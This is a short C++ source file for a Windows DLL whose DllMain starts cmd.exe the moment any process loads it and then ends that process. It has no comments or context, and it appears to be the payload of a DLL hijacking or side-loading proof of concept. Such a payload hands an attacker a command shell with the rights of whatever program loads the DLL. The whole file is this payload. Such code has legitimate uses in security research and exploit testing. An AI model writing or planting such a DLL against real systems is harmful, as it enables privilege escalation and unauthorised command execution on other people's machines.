#include <Windows.h>
#include <ShlObj.h>
#include <string>

__declspec(noreturn) void WINAPI DllMain(
	HMODULE,
	DWORD,
	LPVOID
)
{
	PWSTR system32Ptr;
	if (FAILED(SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &system32Ptr)))
		ExitProcess(1);

	std::wstring cmdPath{ system32Ptr };
	CoTaskMemFree(system32Ptr);
	cmdPath += L"\\cmd.exe";

	PROCESS_INFORMATION pi;
	STARTUPINFOW si{};
	si.cb = sizeof STARTUPINFO;

	if (!CreateProcessW(
		cmdPath.c_str(),
		nullptr,
		nullptr,
		nullptr,
		FALSE,
		0,
		nullptr,
		nullptr,
		&si,
		&pi
	))
		ExitProcess(1);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	ExitProcess(0);
}